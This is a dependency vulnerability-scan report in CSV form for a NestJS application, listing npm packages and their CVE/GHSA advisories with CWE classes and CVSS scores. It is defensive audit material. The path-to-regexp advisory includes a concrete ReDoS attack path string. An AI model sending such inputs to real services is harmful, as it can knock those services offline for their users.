"Project","ScanDate","DependencyName","DependencyPath","Description","License","Md5","Sha1","Identifiers","CPE","CVE","CWE","Vulnerability","Source","CVSSv2_Severity","CVSSv2_Score","CVSSv2","CVSSv3_BaseSeverity","CVSSv3_BaseScore","CVSSv3","CVSSv4_BaseSeverity","CVSSv4_BaseScore","CVSSv4","CPE Confidence","Evidence Count","VendorProject","Product","Name","DateAdded","ShortDescription","RequiredAction","DueDate","Notes"
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",formidable:2.1.2,/src/package-lock.json?superagent:8.1.2/formidable:^2.1.2,"A node.js module for parsing form data, especially file uploads.",MIT,"","",pkg:npm/formidable@2.1.2,cpe:2.3:a:formidable_project:formidable:2.1.2:*:*:*:*:*:*:*,GHSA-75v8-2h7p-7m2m,CWE-338 Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG),"Formidable (aka node-formidable) 2.x before 2.1.3 and 3.x before 3.5.3 relies on hexoid to prevent guessing of filenames for untrusted executable content; however, hexoid is documented as not ""cryptographically secure."" (Also, there is a scenario in which only the last two characters of a hexoid string need to be guessed, but this is not often relevant.) NOTE: this does not imply that, in a typical use case, attackers will be able to exploit any hexoid behavior to upload and execute their own content.",NPM,"","","",LOW,3.0999999046325684,CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N,"","","",HIGHEST,6,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",micromatch:4.0.5,/src/package-lock.json?ts-loader:9.5.1/micromatch:^4.0.0,Glob matching for javascript/node.js. A replacement and faster alternative to minimatch and multimatch.,MIT,"","",pkg:npm/micromatch@4.0.5,cpe:2.3:a:jonschlinkert:micromatch:4.0.5:*:*:*:*:*:*:*,GHSA-952p-6rrq-rcjv,CWE-1333 Inefficient Regular Expression Complexity,"The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.",NPM,"","","",MEDIUM,5.300000190734863,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L,"","","",HIGHEST,8,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",micromatch:4.0.5,/src/package-lock.json?ts-loader:9.5.1/micromatch:^4.0.0,Glob matching for javascript/node.js. A replacement and faster alternative to minimatch and multimatch.,MIT,"","",pkg:npm/micromatch@4.0.5,cpe:2.3:a:jonschlinkert:micromatch:4.0.5:*:*:*:*:*:*:*,CVE-2024-4067,CWE-1333 Inefficient Regular Expression Complexity,"The NPM package `micromatch` prior to 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persists. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching. This issue was fixed in version 4.0.8.",NVD,"","","",MEDIUM,5.3,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:3.9/RC:R/MAV:A,"","","",HIGHEST,8,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",multer:1.4.4-lts.1,/src/package-lock.json?/multer:1.4.4-lts.1,Middleware for handling `multipart/form-data`.,MIT,"","",pkg:npm/multer@1.4.4-lts.1,"",GHSA-4pg4-qvpc-4q3h,CWE-248 Uncaught Exception,"### Impact A vulnerability in Multer versions >=1.4.4-lts.1 allows an attacker to trigger a Denial of Service (DoS) by sending a malformed multi-part upload request. This request causes an unhandled exception, leading to a crash of the process.  ### Patches Users should upgrade to `2.0.0`  ### Workarounds None  ### References  - https://github.com/expressjs/multer/issues/1176 - https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665",NPM,"","","",HIGH,7.5,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,"","","",HIGHEST,5,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",multer:1.4.4-lts.1,/src/package-lock.json?/multer:1.4.4-lts.1,Middleware for handling `multipart/form-data`.,MIT,"","",pkg:npm/multer@1.4.4-lts.1,"",GHSA-fjgf-rc76-4x9p,CWE-248 Uncaught Exception,"### Impact  A vulnerability in Multer versions >= 1.4.4-lts.1, < 2.0.2 allows an attacker to trigger a Denial of Service (DoS) by sending a malformed request. This request causes an unhandled exception, leading to a crash of the process.  ### Patches  Users should upgrade to `2.0.2`  ### Workarounds  None",NPM,"","","",HIGH,7.5,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,"","","",HIGHEST,5,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",multer:1.4.4-lts.1,/src/package-lock.json?/multer:1.4.4-lts.1,Middleware for handling `multipart/form-data`.,MIT,"","",pkg:npm/multer@1.4.4-lts.1,"",GHSA-g5hg-p3ph-g8qg,CWE-248 Uncaught Exception,"### Impact  A vulnerability in Multer versions >=1.4.4-lts.1, <2.0.1 allows an attacker to trigger a Denial of Service (DoS) by sending an upload file request with an empty string field name. This request causes an unhandled exception, leading to a crash of the process.  ### Patches  Users should upgrade to `2.0.1`  ### Workarounds  None  ### References  https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9 https://github.com/expressjs/multer/issues/1233 https://github.com/expressjs/multer/pull/1256",NPM,"","","","","","","","","",HIGHEST,5,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",mysql2:3.9.4,/src/package-lock.json?/mysql2:3.9.4,"fast mysql driver. Implements core protocol, prepared statements, ssl and compression in native JS",MIT,"","",pkg:npm/mysql2@3.9.4,cpe:2.3:a:sidorares:mysql2:3.9.4:*:*:*:*:*:*:*,GHSA-4rch-2fh8-94vw,CWE-94 Improper Control of Generation of Code ('Code Injection'),Versions of the package mysql2 before 3.9.7 are vulnerable to Arbitrary Code Injection due to improper sanitization of the timezone parameter in the readCodeFor function by calling a native MySQL Server date/time function.,NPM,"","","",CRITICAL,9.800000190734863,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,"","","",HIGHEST,7,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",mysql2:3.9.4,/src/package-lock.json?/mysql2:3.9.4,"fast mysql driver. Implements core protocol, prepared statements, ssl and compression in native JS",MIT,"","",pkg:npm/mysql2@3.9.4,cpe:2.3:a:sidorares:mysql2:3.9.4:*:*:*:*:*:*:*,GHSA-pmh2-wpjm-fj45,CWE-1321 Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'),Versions of the package mysql2 before 3.9.8 are vulnerable to Prototype Pollution due to improper user input sanitization passed to fields and tables when using nestTables.,NPM,"","","",HIGH,8.199999809265137,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L,"","","",HIGHEST,7,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",path-to-regexp:3.2.0,/src/package-lock.json?/path-to-regexp:3.2.0,Express style path to RegExp utility,MIT,"","",pkg:npm/path-to-regexp@3.2.0,"",GHSA-9wv6-86v2-598j,CWE-1333 Inefficient Regular Expression Complexity,"### Impact  A bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`.  ### Patches  For users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.  These versions add backtrack protection when a custom regex pattern is not provided:  - [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10) - [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0) - [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0) - [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)  They do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.  Version [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.  Version [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.  ### Workarounds  All versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.  If paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.  ### Details  Using `/:a-:b` will produce the regular expression `/^\/([^\/]+?)-([^\/]+?)\/?$/`. This can be exploited by a path such as `/a${'-a'.repeat(8_000)}/a`. [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.  Because JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.  ### References  * [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) * [Detailed blog post](https://blakeembrey.com/posts/2024-09-web-redos/)",NPM,"","","",HIGH,7.5,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,"","","",HIGHEST,5,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",send:0.18.0,/src/package-lock.json?serve-static:1.15.0/send:0.18.0,Better streaming static file server with Range and conditional-GET support,MIT,"","",pkg:npm/send@0.18.0,cpe:2.3:a:send_project:send:0.18.0:*:*:*:*:*:*:*,GHSA-m6fv-jmcg-4jfg,CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),"### Impact  passing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code  ### Patches  this issue is patched in send 0.19.0  ### Workarounds  users are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist  ### Details  successful exploitation of this vector requires the following:  1. The attacker MUST control the input to response.redirect() 1. express MUST NOT redirect before the template appears 1. the browser MUST NOT complete redirection before: 1. the user MUST click on the link in the template",NPM,"","","",MEDIUM,5.0,CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L,"","","",HIGHEST,6,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",send:0.18.0,/src/package-lock.json?serve-static:1.15.0/send:0.18.0,Better streaming static file server with Range and conditional-GET support,MIT,"","",pkg:npm/send@0.18.0,cpe:2.3:a:send_project:send:0.18.0:*:*:*:*:*:*:*,CVE-2024-43799,CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),Send is a library for streaming files from the file system as a http response. Send passes untrusted user input to SendStream.redirect() which executes untrusted code. This issue is patched in send 0.19.0.,NVD,"","","",MEDIUM,4.7,CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N/E:1.6/RC:R/MAV:A,"","","",HIGHEST,6,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",serve-static:1.15.0,/src/package-lock.json?/serve-static:1.15.0,Serve static files,MIT,"","",pkg:npm/serve-static@1.15.0,cpe:2.3:a:serve-static_project:serve-static:1.15.0:*:*:*:*:*:*:*,GHSA-cm22-4g7w-348p,CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),"### Impact  passing untrusted user input - even after sanitizing it - to `redirect()` may execute untrusted code  ### Patches  this issue is patched in serve-static 1.16.0  ### Workarounds  users are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist  ### Details  successful exploitation of this vector requires the following:  1. The attacker MUST control the input to response.redirect() 1. express MUST NOT redirect before the template appears 1. the browser MUST NOT complete redirection before: 1. the user MUST click on the link in the template",NPM,"","","",MEDIUM,5.0,CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L,"","","",HIGHEST,6,"","","","","","","",""
